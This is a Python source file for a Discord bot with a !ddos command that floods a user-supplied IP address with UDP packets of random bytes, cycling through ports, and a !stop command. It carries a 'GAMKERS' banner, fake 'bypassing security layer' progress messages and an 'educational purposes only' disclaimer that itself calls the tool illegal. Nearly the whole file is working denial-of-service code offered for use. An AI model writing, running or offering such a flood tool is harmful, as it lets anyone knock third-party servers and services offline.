import discord
from discord.ext import commands, tasks
import os
import time
import socket
import random
from datetime import datetime

TOKEN = "TOKEN_DO_SEU_BOT"

bot = commands.Bot(command_prefix='!')

attack_running = False

@bot.event
async def on_ready():
    print('Bot is ready.')

@bot.command()
async def ddos(ctx, ip: str, port: int):
    global attack_running
    if attack_running:
        await ctx.send("There's already an attack in progress.")
        return

    print("Starting DDOS attack on {}:{}...".format(ip, port))
    await ctx.send('Starting DDOS attack on {}:{}...'.format(ip, port))
    attack_running = True

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    os.system("figlet GMKR-Ddos")
    print("\nCoded By : GAMKERS")
    print("Author   : GAMKERS")
    print("Github   : github.com/gamkers")
    print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions")
    print("Team : GAMKERS")
    print("\033[92m")
    print("________________TRYING TO REACH THE SERVER_____________________")
    await ctx.send("Trying to reach the server...")
    time.sleep(5)
    print("_________________ESTABLISHING CONNECTION_______________________")
    await ctx.send("Establishing connection...")
    time.sleep(5)
    print("_________0100100 BYPASSING SECURITY LAYER 001010_______________")
    await ctx.send("Bypassing security layer...")
    time.sleep(5)
    print("_________________CONNECTION ESTABLISHED________________________")
    await ctx.send("Connection established...")
    time.sleep(5)
    print("    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
    await ctx.send("DDOS attack started. Note: Only for educational purposes")

    @tasks.loop(seconds=1)
    async def attack_status():
        await ctx.send("DDOS attack ongoing...")

    attack_status.start()

    sent = 0
    while attack_running:
         sock.sendto(bytes, (ip, port))
         sent = sent + 1
         port = port + 1
         print("Sent %s packet to %s through port:%s" % (sent, ip, port))
         if port == 65534:
             port = 1
         time.sleep(0.01)

@bot.command()
async def stop(ctx):
    global attack_running
    if not attack_running:
        await ctx.send("There's no attack running to stop.")
        return

    attack_running = False
    await ctx.send("DDOS attack stopped.")

bot.run(TOKEN)
